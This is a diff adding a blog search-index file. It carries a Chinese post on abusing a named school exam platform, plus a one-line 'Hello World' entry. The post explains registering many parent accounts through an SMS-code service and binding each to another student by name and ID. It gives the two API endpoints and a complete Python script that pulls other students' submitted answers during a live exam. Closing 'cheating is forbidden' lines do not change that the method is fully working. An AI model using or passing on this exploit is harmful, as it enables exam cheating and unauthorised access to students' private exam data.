@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>某分数的脑瘫漏洞</title>
+    <link href="/2022/11/30/%E6%9F%90%E5%88%86%E6%95%B0%E7%9A%84%E8%84%91%E7%98%AB%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2022/11/30/%E6%9F%90%E5%88%86%E6%95%B0%E7%9A%84%E8%84%91%E7%98%AB%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>半年之前搞过<a href="https://www.52pojie.cn/thread-1613563-1-1.html">某师某课</a> 可能学校意识到普遍分数过高是平台的问题 于是换了某分数提交考试卷子<br>既然是教育网站 那么或多或少会有一些<em>脑瘫</em>问题<br>本着研究但不利用的原则 便有了以下折腾的过程</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="思路1-失败"><a href="#思路1-失败" class="headerlink" title="思路1-失败"></a>思路1-失败</h3><p>通过考完试比对答案的接口 假装考试已经结束 发送数据来请求答案<br>结果：<br><img src="https://file.moetu.org/images/2022/11/30/QQ2022113016084910b9d203bd6441b9.png" alt="QQ2022113016084910b9d203bd6441b9.png"><br>很显然 人家已经想到了这个问题 不出分是无法获取到答案的</p><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>依稀记得家长端在绑定学生时 只需要输入对应的姓名和学号即可<br>那么可不可以用家长端绑定好学生 在考试期间获取他们的答案呢？<br>先说结果 这个思路是可以的<br>已知每个家长号能绑定最多两个学生 且半年后才能换绑<br>那么我们只要注册足够多的家长号 即可随便绑学生<br>这里用x码平台 具体懂得都懂<br><img src="https://file.moetu.org/images/2022/11/30/QQ2022113016152337787bb6a3ff1f0c.png" alt="QQ2022113016152337787bb6a3ff1f0c.png"><br>然后我们每个号绑定一个好学生<br>接下来分析提交的答案是怎么获取的<br>首先明确这个平台的几个概念：<br>不管是学生号还是家长号 都是一个账号对应一个hfs-session-id<br>家长号切换孩子后 同样的hfs-session-id获取到的卷子为切换到的学生的<br>考试部分获取答案总共需要两个包<br>第一个：<br><img src="https://file.moetu.org/images/2022/11/30/1669797102921733a2e84f10e496c.png" alt="1669797102921733a2e84f10e496c.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hfs-be.yunxiao.com<span class="hljs-regexp">/v2/</span>online-exams/token?examId=考试id&amp;paperId=完整的试卷id<br></code></pre></td></tr></table></figure><p>这里需要注意一下 发包时除了要处理headers<br>还要把hfs-session-id写到cookies里去<br>成功的话 会返回一个阅卷token<br>第二个：<br>利用这个阅卷token去获取已经提交的答案<br><img src="https://file.moetu.org/images/2022/11/30/16697974244783cc94e717b800755.png" alt="16697974244783cc94e717b800755.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//y</span>j-apigw.haofenshu.com<span class="hljs-regexp">/v370/</span>structure/online?paperid=试卷id<br></code></pre></td></tr></table></figure><p>这里需要注意 这个包不要有cookies<br>要把获取到的阅卷token加到headers里<br>成功的话 会返回一个json 里面存有选项和提交的答案<br><img src="https://file.moetu.org/images/2022/11/30/16697980380364dd53c1cbbb9d6f6.png" alt="16697980380364dd53c1cbbb9d6f6.png"><br>（这里还没提交 所以是空的）<br>然后 我们模拟这个流程 用python写个发包解析的程序</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import json<br><br><span class="hljs-attribute">examid</span>=<span class="hljs-string">&quot;考试id&quot;</span><br><span class="hljs-attribute">paperid</span>=<span class="hljs-string">&quot;试卷id&quot;</span><br><span class="hljs-attribute">paperidfull</span>=<span class="hljs-string">&quot;完整的试卷id&quot;</span><br><br>stu_tokens = [<br>    <span class="hljs-string">&quot;eyxxxxxxx&quot;</span>,#家长token<br>]<br><br><span class="hljs-attribute">count</span>=1<br><span class="hljs-keyword">for</span> stu <span class="hljs-keyword">in</span> stu_tokens:<br>    <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;https://hfs-be.yunxiao.com/v2/online-exams/token?examId=&quot;</span>+examid+&quot;&amp;paperId=&quot;+paperidfull<br>    cookie = &#123;<span class="hljs-string">&#x27;hfs-session-id&#x27;</span>: stu&#125;<br>    headers = &#123;<span class="hljs-string">&#x27;devicetype&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;apptype&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;versionname&#x27;</span>: <span class="hljs-string">&quot;4.30.91&quot;</span>,<span class="hljs-string">&#x27;user-agent&#x27;</span>: <span class="hljs-string">&quot;YX Android 10&quot;</span>&#125;<br>    <span class="hljs-attribute">req</span>=requests.get(url=url,headers=headers,cookies=cookie)<br>    #<span class="hljs-built_in">print</span>(req.text)<br>    <span class="hljs-attribute">yuejuan</span>=json.loads(req.text).get(&#x27;data&#x27;).get(&#x27;token&#x27;)<br>    headers.update(&#123;<span class="hljs-string">&#x27;hfs-app-token&#x27;</span>: yuejuan&#125;)<br>    <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;https://yj-apigw.haofenshu.com/v370/structure/online?paperid=&quot;</span>+paperid<br>    <span class="hljs-attribute">req</span>=requests.get(url=url,headers=headers)<br>    #<span class="hljs-built_in">print</span>(req.text)<br>    <span class="hljs-attribute">keguanti</span>=json.loads(req.text).get(&#x27;data&#x27;).get(&#x27;keguanti&#x27;)<br>    <span class="hljs-attribute">zhuguanti</span>=json.loads(req.text).get(&#x27;data&#x27;).get(&#x27;zhuguanti&#x27;)<br>    <span class="hljs-keyword">for</span> dati <span class="hljs-keyword">in</span> keguanti:<br>        <span class="hljs-built_in">print</span>(dati[<span class="hljs-string">&quot;name&quot;</span>])<br>        <span class="hljs-attribute">questions_list</span>=dati[<span class="hljs-string">&quot;questions&quot;</span>]<br>        <span class="hljs-keyword">for</span> xiaoti <span class="hljs-keyword">in</span> questions_list:<br>            <span class="hljs-keyword">if</span> xiaoti[<span class="hljs-string">&quot;stuAns&quot;</span>] !=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">and</span> xiaoti[<span class="hljs-string">&quot;stuAns&quot;</span>] !=<span class="hljs-string">&quot;-&quot;</span>:<br>                <span class="hljs-built_in">print</span>(xiaoti[<span class="hljs-string">&quot;name&quot;</span>]+<span class="hljs-string">&quot; &quot;</span>+xiaoti[<span class="hljs-string">&quot;stuAns&quot;</span>])<br>    <span class="hljs-keyword">for</span> ti <span class="hljs-keyword">in</span> zhuguanti:<br>        <span class="hljs-attribute">pic_list</span>=ti[<span class="hljs-string">&quot;httpPath&quot;</span>]<br>        <span class="hljs-keyword">if</span> pic_list != None:<br>            <span class="hljs-built_in">print</span>(ti[<span class="hljs-string">&quot;name&quot;</span>]+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-string">&quot; &quot;</span>.join(pic_list))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;========== |&quot;</span>+str(count))<br>    count+=1<br></code></pre></td></tr></table></figure><p>在考试结束的交卷时间里 我们一直重复运行即可<br><img src="https://file.moetu.org/images/2022/11/30/_202211301701057972bff817c29be4.png" alt="_202211301701057972bff817c29be4.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><strong>严禁作弊！！！</strong><br><strong>严禁作弊！！！</strong><br><strong>严禁作弊！！！</strong></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>逆向</tag>
+      
+      <tag>教育</tag>
+      
+      <tag>网络</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="/2022/11/30/hello-world/"/>
+    <url>/2022/11/30/hello-world/</url>
+    
+    <content type="html"><![CDATA[<p>I’m back now…</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
